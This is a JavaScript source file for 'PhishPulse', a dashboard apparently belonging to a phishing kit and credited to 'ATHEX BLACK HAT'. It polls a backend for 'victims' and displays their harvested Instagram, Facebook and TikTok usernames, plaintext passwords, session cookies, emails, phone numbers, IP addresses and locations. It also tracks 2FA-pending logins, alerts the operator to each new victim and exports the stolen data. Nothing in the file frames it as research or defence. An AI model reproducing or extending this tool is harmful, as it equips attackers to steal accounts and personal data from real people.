/**
 * PhishPulse Dashboard - JavaScript
 * Real-time updates, tab switching, animations, interactions
 * Version: 1.1 (Fixed)
 * Author: ATHEX BLACK HAT
 */

// ============================================
// GLOBAL VARIABLES
// ============================================
let autoRefreshInterval = null;
let previousVictimCount = 0;
let soundEnabled = true;
let currentTab = 'victims';

// ============================================
// PARTICLES BACKGROUND
// ============================================
function createParticles() {
    const container = document.getElementById('particles');
    if (!container) return;
    
    const colors = ['#00ff88', '#00cc66', '#009944', '#00ffaa', '#44ff88'];
    
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.width = Math.random() * 3 + 1 + 'px';
        particle.style.height = particle.style.width;
        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
        particle.style.animationDelay = Math.random() * 5 + 's';
        container.appendChild(particle);
    }
}

// ============================================
// TAB SWITCHING
// ============================================
function switchTab(tabName) {
    currentTab = tabName;
    
    // Hide all content sections
    const sections = ['victims-container', 'sessions-container', 'analytics-container', 'settings-container'];
    sections.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
    
    // Show selected section
    const activeSection = document.getElementById(tabName + '-container');
    if (activeSection) {
        activeSection.style.display = 'block';
    }
    
    // Update active nav link
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-tab') === tabName) {
            link.classList.add('active');
        }
    });
    
    // Load analytics if switching to analytics tab
    if (tabName === 'analytics') {
        loadAnalytics();
    }
    
    // Refresh data if switching to victims tab
    if (tabName === 'victims') {
        fetchDashboardData();
    }
}

// ============================================
// SOUND NOTIFICATION
// ============================================
function playNotificationSound() {
    if (!soundEnabled) return;
    const audio = document.getElementById('notification-sound');
    if (audio) {
        audio.currentTime = 0;
        audio.play().catch(() => {});
    }
}

// ============================================
// TOAST NOTIFICATION
// ============================================
function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.textContent = message;
    
    if (type === 'error') {
        toast.style.borderColor = 'var(--accent-red)';
        toast.style.color = 'var(--accent-red)';
        toast.style.boxShadow = 'var(--glow-red)';
    }
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

// ============================================
// FORMAT TIME AGO
// ============================================
function timeAgo(timestamp) {
    if (!timestamp) return 'Unknown';
    
    const now = new Date();
    const past = new Date(timestamp.replace(' ', 'T'));
    const diff = Math.floor((now - past) / 1000);
    
    if (diff < 5) return 'Just now';
    if (diff < 60) return diff + 's ago';
    if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
    if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
    return Math.floor(diff / 86400) + 'd ago';
}

// ============================================
// COPY TO CLIPBOARD
// ============================================
function copyToClipboard(text, button) {
    navigator.clipboard.writeText(text).then(() => {
        const originalText = button.textContent;
        button.textContent = '✅ Copied!';
        button.style.color = 'var(--accent-green)';
        
        setTimeout(() => {
            button.textContent = originalText;
            button.style.color = '';
        }, 2000);
        
        showToast('Copied to clipboard!');
    }).catch(() => {
        showToast('Failed to copy', 'error');
    });
}

function copyAllData(cardElement) {
    const dataRows = cardElement.querySelectorAll('.data-row');
    let text = '';
    dataRows.forEach(row => {
        const label = row.querySelector('.data-label')?.textContent?.trim() || '';
        const value = row.querySelector('.data-value')?.textContent?.trim() || '';
        text += `${label}: ${value}\n`;
    });
    copyToClipboard(text, cardElement.querySelector('.btn-copy'));
}

// ============================================
// TOGGLE CARD EXPAND
// ============================================
function toggleCard(header) {
    const card = header.closest('.victim-card');
    if (card) {
        card.classList.toggle('expanded');
    }
}

// ============================================
// DELETE VICTIM
// ============================================
function deleteVictim(id, button) {
    if (!confirm('Delete this entry?')) return;
    
    fetch(`api.php?action=delete_victim&id=${id}`)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                const card = button.closest('.victim-card');
                if (card) {
                    card.style.animation = 'slideOut 0.3s ease forwards';
                    setTimeout(() => {
                        if (card.parentNode) card.parentNode.removeChild(card);
                    }, 300);
                }
                showToast('Entry deleted');
                fetchDashboardData();
            }
        })
        .catch(() => showToast('Failed to delete', 'error'));
}

// ============================================
// DELETE SESSION
// ============================================
function deleteSession(sessionId, button) {
    if (!confirm('Delete this entire session?')) return;
    
    fetch(`api.php?action=delete_session&session_id=${sessionId}`)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                const card = button.closest('.session-card');
                if (card) {
                    card.style.animation = 'slideOut 0.3s ease forwards';
                    setTimeout(() => {
                        if (card.parentNode) card.parentNode.removeChild(card);
                    }, 300);
                }
                showToast('Session deleted');
                fetchDashboardData();
            }
        })
        .catch(() => showToast('Failed to delete', 'error'));
}

// ============================================
// EXPORT DATA
// ============================================
function exportData() {
    window.open('api.php?action=export', '_blank');
    showToast('Exporting data...');
}

// ============================================
// CLEAR ALL DATA
// ============================================
function clearAllData() {
    if (!confirm('⚠️ Delete ALL data? This cannot be undone!')) return;
    if (!confirm('Are you ABSOLUTELY sure?')) return;
    
    fetch('api.php?action=clear_all')
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                showToast('All data cleared');
                fetchDashboardData();
            }
        })
        .catch(() => showToast('Failed to clear data', 'error'));
}

// ============================================
// FETCH DATA & UPDATE DASHBOARD
// ============================================
function fetchDashboardData() {
    const filter = document.getElementById('filter-select')?.value || 'all';
    const platform = document.getElementById('platform-select')?.value || 'all';
    const search = document.getElementById('search-input')?.value || '';
    
    let url = `api.php?action=get_data&filter=${filter}&platform=${platform}&search=${encodeURIComponent(search)}`;
    
    fetch(url)
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                updateStatsBar(data.stats);
                updateVictimList(data.victims);
                updateLastUpdateTime(data.timestamp);
                
                // Check for new victims
                if (data.stats.total_victims > previousVictimCount && previousVictimCount > 0) {
                    playNotificationSound();
                    showToast('🔔 New victim detected!');
                }
                previousVictimCount = data.stats.total_victims;
            }
        })
        .catch(err => console.error('Fetch error:', err));
}

function updateStatsBar(stats) {
    if (!stats) return;
    
    const elements = {
        'stat-success': stats.success_count || 0,
        'stat-failed': stats.failed_count || 0,
        'stat-pending': stats['2fa_pending_count'] || 0,
        'stat-total': stats.total_victims || 0,
        'stat-active': stats.active_sessions || 0,
    };
    
    for (const [id, value] of Object.entries(elements)) {
        const el = document.getElementById(id);
        if (el) {
            animateValue(el, parseInt(el.textContent) || 0, value, 500);
        }
    }
}

function animateValue(element, start, end, duration) {
    if (start === end) return;
    const range = end - start;
    const increment = range > 0 ? 1 : -1;
    const stepTime = Math.abs(Math.floor(duration / (Math.abs(range) || 1)));
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        element.textContent = current;
        if (current === end) clearInterval(timer);
    }, stepTime);
}

function updateVictimList(victims) {
    const container = document.getElementById('victims-container');
    if (!container) return;
    
    if (!victims || victims.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <div class="empty-icon">👻</div>
                <h3>No victims yet</h3>
                <p>Waiting for incoming data...</p>
                <div class="waiting-dots">
                    <div class="waiting-dot"></div>
                    <div class="waiting-dot"></div>
                    <div class="waiting-dot"></div>
                </div>
            </div>
        `;
        return;
    }
    
    let html = '';
    victims.forEach(victim => {
        html += renderVictimCard(victim);
    });
    
    container.innerHTML = html;
}

function renderVictimCard(victim) {
    const platformClass = victim.platform || 'instagram';
    const statusClass = (victim.status === '2fa_pending') ? 'pending' : (victim.status || 'success');
    const country = victim.device?.country || 'Unknown';
    const countryFlag = getCountryFlag(country);
    const time = timeAgo(victim.timestamp);
    const platformIcon = getPlatformIcon(victim.platform);
    
    let html = `
    <div class="victim-card ${statusClass}" id="victim-${victim.id}">
        <div class="card-header" onclick="toggleCard(this)">
            <div class="card-header-left">
                <span class="platform-badge ${platformClass}">${platformIcon} ${platformClass}</span>
                <span class="status-badge ${statusClass}">${getStatusEmoji(victim.status)} ${(victim.status || 'success').toUpperCase()}</span>
                <span class="card-country">${countryFlag}</span>
                <span style="color: var(--text-secondary);">${escapeHtml(country)}</span>
            </div>
            <span class="card-time">🕐 ${time}</span>
        </div>
        <div class="card-body">
            <div class="data-grid">
                <!-- Credentials Section -->
                <div class="data-section">
                    <div class="data-section-title">🔑 Credentials</div>
                    <div class="data-row">
                        <span class="data-label">Username:</span>
                        <span class="data-value">${escapeHtml(victim.username || 'N/A')}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Password:</span>
                        <span class="data-value password">${escapeHtml(victim.password || 'N/A')}</span>
                    </div>`;
    
    // Cookies section (only for success)
    if (statusClass === 'success' && victim.cookies) {
        html += `
                </div>
                <!-- Cookies Section -->
                <div class="data-section">
                    <div class="data-section-title">🍪 Cookies</div>`;
        
        if (typeof victim.cookies === 'object') {
            for (const [key, value] of Object.entries(victim.cookies)) {
                if (typeof value === 'string') {
                    html += `
                    <div class="data-row">
                        <span class="data-label">${escapeHtml(key)}:</span>
                        <span class="data-value cookie">${escapeHtml(value.substring(0, 50))}${value.length > 50 ? '...' : ''}</span>
                    </div>`;
                }
            }
        }
    }
    
    // Profile section (only for success)
    if (statusClass === 'success' && victim.profile && Object.keys(victim.profile).length > 0) {
        html += `
                </div>
                <!-- Profile Section -->
                <div class="data-section">
                    <div class="data-section-title">👤 Profile Info</div>`;
        
        const profile = victim.profile;
        if (profile.email) {
            html += `
                    <div class="data-row">
                        <span class="data-label">📧 Email:</span>
                        <span class="data-value">${escapeHtml(profile.email)}</span>
                    </div>`;
        }
        if (profile.phone) {
            html += `
                    <div class="data-row">
                        <span class="data-label">📱 Phone:</span>
                        <span class="data-value">${escapeHtml(profile.phone)}</span>
                    </div>`;
        }
        if (profile.full_name) {
            html += `
                    <div class="data-row">
                        <span class="data-label">👤 Name:</span>
                        <span class="data-value">${escapeHtml(profile.full_name)}</span>
                    </div>`;
        }
        if (profile.followers) {
            html += `
                    <div class="data-row">
                        <span class="data-label">👥 Followers:</span>
                        <span class="data-value">${Number(profile.followers).toLocaleString()}</span>
                    </div>`;
        }
        if (profile.following) {
            html += `
                    <div class="data-row">
                        <span class="data-label">👣 Following:</span>
                        <span class="data-value">${Number(profile.following).toLocaleString()}</span>
                    </div>`;
        }
        if (profile.is_verified) {
            html += `
                    <div class="data-row">
                        <span class="data-label">✅ Verified:</span>
                        <span class="data-value" style="color: var(--accent-green);">Yes</span>
                    </div>`;
        }
        if (profile.bio) {
            html += `
                    <div class="data-row">
                        <span class="data-label">📝 Bio:</span>
                        <span class="data-value">${escapeHtml(profile.bio.substring(0, 100))}${profile.bio.length > 100 ? '...' : ''}</span>
                    </div>`;
        }
    }
    
    // Device section
    html += `
                </div>
                <!-- Device Section -->
                <div class="data-section">
                    <div class="data-section-title">🌍 Device Info</div>`;
    
    if (victim.device) {
        const device = victim.device;
        if (device.ip_address) {
            html += `
                    <div class="data-row">
                        <span class="data-label">🌐 IP:</span>
                        <span class="data-value">${escapeHtml(device.ip_address)}</span>
                    </div>`;
        }
        if (device.country) {
            html += `
                    <div class="data-row">
                        <span class="data-label">🏳️ Country:</span>
                        <span class="data-value">${countryFlag} ${escapeHtml(device.country)}</span>
                    </div>`;
        }
        if (device.city) {
            html += `
                    <div class="data-row">
                        <span class="data-label">🏙️ City:</span>
                        <span class="data-value">${escapeHtml(device.city)}</span>
                    </div>`;
        }
        if (device.isp) {
            html += `
                    <div class="data-row">
                        <span class="data-label">📡 ISP:</span>
                        <span class="data-value">${escapeHtml(device.isp)}</span>
                    </div>`;
        }
        if (device.is_vpn) {
            html += `
                    <div class="data-row">
                        <span class="data-label">🔒 VPN:</span>
                        <span class="data-value" style="color: var(--accent-yellow);">⚠️ Detected</span>
                    </div>`;
        }
    }
    
    html += `
                </div>
            </div>
            
            <div class="card-actions">
                <button class="btn btn-copy" onclick="copyAllData(this.closest('.victim-card'))">📋 Copy All</button>
                <button class="btn btn-danger" onclick="deleteVictim(${victim.id}, this)">🗑️ Delete</button>
            </div>
        </div>
    </div>`;
    
    return html;
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function escapeHtml(text) {
    if (!text) return 'N/A';
    const div = document.createElement('div');
    div.textContent = String(text);
    return div.innerHTML;
}

function getCountryFlag(country) {
    const flags = {
        'Pakistan': '🇵🇰', 'United States': '🇺🇸', 'USA': '🇺🇸',
        'India': '🇮🇳', 'United Kingdom': '🇬🇧', 'UK': '🇬🇧',
        'Canada': '🇨🇦', 'Australia': '🇦🇺', 'Germany': '🇩🇪',
        'France': '🇫🇷', 'Brazil': '🇧🇷', 'Indonesia': '🇮🇩',
        'Bangladesh': '🇧🇩', 'Turkey': '🇹🇷', 'Saudi Arabia': '🇸🇦',
        'UAE': '🇦🇪', 'Nigeria': '🇳🇬', 'Egypt': '🇪🇬',
        'Russia': '🇷🇺', 'China': '🇨🇳', 'Japan': '🇯🇵',
        'South Korea': '🇰🇷', 'Mexico': '🇲🇽', 'Spain': '🇪🇸',
        'Italy': '🇮🇹', 'Netherlands': '🇳🇱',
        'Unknown': '🌍', 'Local': '💻', 'Local Network': '💻'
    };
    return flags[country] || '🌍';
}

function getPlatformIcon(platform) {
    const icons = {
        'instagram': '📸',
        'facebook': '👤',
        'tiktok': '🎵'
    };
    return icons[platform] || '📱';
}

function getStatusEmoji(status) {
    const emojis = {
        'success': '✅',
        'failed': '❌',
        '2fa_pending': '⏳',
        'active': '🔄',
        'completed': '✅'
    };
    return emojis[status] || '❓';
}

function updateLastUpdateTime(timestamp) {
    const el = document.getElementById('last-update-time');
    if (el) {
        el.textContent = timestamp || new Date().toLocaleTimeString();
    }
}

// ============================================
// AUTO-REFRESH
// ============================================
function startAutoRefresh() {
    const interval = 2000; // 2 seconds
    autoRefreshInterval = setInterval(fetchDashboardData, interval);
}

function stopAutoRefresh() {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
    }
}

function toggleAutoRefresh() {
    const toggle = document.getElementById('auto-refresh-toggle');
    if (toggle && toggle.checked) {
        startAutoRefresh();
        showToast('Auto-refresh ON');
    } else {
        stopAutoRefresh();
        showToast('Auto-refresh OFF');
    }
}

// ============================================
// ANALYTICS
// ============================================
function loadAnalytics() {
    fetch('api.php?action=get_stats')
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                renderAnalytics(data.stats);
            }
        })
        .catch(() => console.error('Analytics load error'));
}

function renderAnalytics(stats) {
    const container = document.getElementById('analytics-container');
    if (!container) return;
    
    const total = Math.max(stats.total_victims || 0, 1);
    const successRate = stats.success_rate || 0;
    const instagramPct = Math.round((stats.instagram_count || 0) / total * 100);
    const facebookPct = Math.round((stats.facebook_count || 0) / total * 100);
    const tiktokPct = Math.round((stats.tiktok_count || 0) / total * 100);
    
    let countriesHtml = '';
    if (stats.countries && Object.keys(stats.countries).length > 0) {
        const maxCount = Math.max(...Object.values(stats.countries), 1);
        let i = 0;
        for (const [country, count] of Object.entries(stats.countries)) {
            if (i++ >= 5) break;
            const pct = Math.round((count / maxCount) * 100);
            countriesHtml += `
                <div class="bar-row">
                    <span class="bar-label">${getCountryFlag(country)} ${country}</span>
                    <div class="bar-track">
                        <div class="bar-fill success" style="width: ${pct}%">${count}</div>
                    </div>
                </div>`;
        }
    }
    
    container.innerHTML = `
        <div class="analytics-grid">
            <div class="analytics-card">
                <div class="analytics-title">📊 Platform Distribution</div>
                <div class="bar-chart">
                    <div class="bar-row">
                        <span class="bar-label">📸 Instagram</span>
                        <div class="bar-track">
                            <div class="bar-fill instagram" style="width: ${instagramPct}%">${stats.instagram_count || 0}</div>
                        </div>
                    </div>
                    <div class="bar-row">
                        <span class="bar-label">👤 Facebook</span>
                        <div class="bar-track">
                            <div class="bar-fill facebook" style="width: ${facebookPct}%">${stats.facebook_count || 0}</div>
                        </div>
                    </div>
                    <div class="bar-row">
                        <span class="bar-label">🎵 TikTok</span>
                        <div class="bar-track">
                            <div class="bar-fill tiktok" style="width: ${tiktokPct}%">${stats.tiktok_count || 0}</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="analytics-card">
                <div class="analytics-title">📈 Success Rate: ${successRate}%</div>
                <div class="bar-chart">
                    <div class="bar-row">
                        <span class="bar-label">✅ Success</span>
                        <div class="bar-track">
                            <div class="bar-fill success" style="width: ${successRate}%">${stats.success_count || 0}</div>
                        </div>
                    </div>
                    <div class="bar-row">
                        <span class="bar-label">❌ Failed</span>
                        <div class="bar-track">
                            <div class="bar-fill failed" style="width: ${100 - successRate}%">${stats.failed_count || 0}</div>
                        </div>
                    </div>
                </div>
                <div style="text-align: center; margin-top: 15px; font-size: 24px; color: var(--accent-green);">
                    ${successRate}% Success Rate
                </div>
            </div>
        </div>
        
        <div class="analytics-card" style="margin-top: 15px;">
            <div class="analytics-title">🌍 Top Countries</div>
            <div class="bar-chart">
                ${countriesHtml || '<p style="color: var(--text-muted); text-align: center;">No data yet</p>'}
            </div>
        </div>
        
        <div class="analytics-card" style="margin-top: 15px;">
            <div class="analytics-title">📅 Today's Stats</div>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; text-align: center;">
                <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                    <div style="font-size: 28px; color: var(--accent-green);">${stats.today_count || 0}</div>
                    <div style="font-size: 11px; color: var(--text-muted);">Today's Victims</div>
                </div>
                <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                    <div style="font-size: 28px; color: var(--accent-cyan);">${stats.active_sessions || 0}</div>
                    <div style="font-size: 11px; color: var(--text-muted);">Active Sessions</div>
                </div>
            </div>
        </div>
    `;
}

// ============================================
// DEBOUNCE SEARCH
// ============================================
function debounceSearch(value) {
    clearTimeout(window.searchTimeout);
    window.searchTimeout = setTimeout(() => {
        fetchDashboardData();
    }, 500);
}

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    // Initialize particles
    createParticles();
    
    // Initial data load
    fetchDashboardData();
    
    // Start auto-refresh
    startAutoRefresh();
    
    // Auto-refresh toggle
    const refreshToggle = document.getElementById('auto-refresh-toggle');
    if (refreshToggle) {
        refreshToggle.addEventListener('change', toggleAutoRefresh);
    }
    
    // Sound toggle
    const soundToggle = document.getElementById('sound-toggle');
    if (soundToggle) {
        soundToggle.addEventListener('change', function() {
            soundEnabled = this.checked;
            showToast(soundEnabled ? 'Sound ON' : 'Sound OFF');
        });
    }
    
    // Filter change
    const filterSelect = document.getElementById('filter-select');
    if (filterSelect) {
        filterSelect.addEventListener('change', fetchDashboardData);
    }
    
    // Platform change
    const platformSelect = document.getElementById('platform-select');
    if (platformSelect) {
        platformSelect.addEventListener('change', fetchDashboardData);
    }
    
    // Search input
    const searchInput = document.getElementById('search-input');
    if (searchInput) {
        searchInput.addEventListener('input', function() {
            debounceSearch(this.value);
        });
    }
    
    // Navigation tab clicks
    document.querySelectorAll('.nav-link[data-tab]').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const tabName = this.getAttribute('data-tab');
            switchTab(tabName);
        });
    });
    
    // Stat card clicks for filtering
    document.querySelectorAll('.stat-card').forEach(card => {
        card.addEventListener('click', function() {
            const filterMap = {
                'success': 'success',
                'failed': 'failed',
                'pending': '2fa_pending',
                'total': 'all',
                'active': 'all'
            };
            
            for (const [cls, filter] of Object.entries(filterMap)) {
                if (this.classList.contains(cls)) {
                    const filterSelect = document.getElementById('filter-select');
                    if (filterSelect) {
                        filterSelect.value = filter;
                        switchTab('victims');
                        fetchDashboardData();
                    }
                    break;
                }
            }
        });
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'f') {
            e.preventDefault();
            const searchInput = document.getElementById('search-input');
            if (searchInput) searchInput.focus();
        }
        if (e.ctrlKey && e.key === 'r') {
            e.preventDefault();
            fetchDashboardData();
            showToast('Refreshed!');
        }
    });
});

// Export functions for global use
window.copyToClipboard = copyToClipboard;
window.copyAllData = copyAllData;
window.toggleCard = toggleCard;
window.deleteVictim = deleteVictim;
window.deleteSession = deleteSession;
window.exportData = exportData;
window.clearAllData = clearAllData;
window.switchTab = switchTab;
window.fetchDashboardData = fetchDashboardData;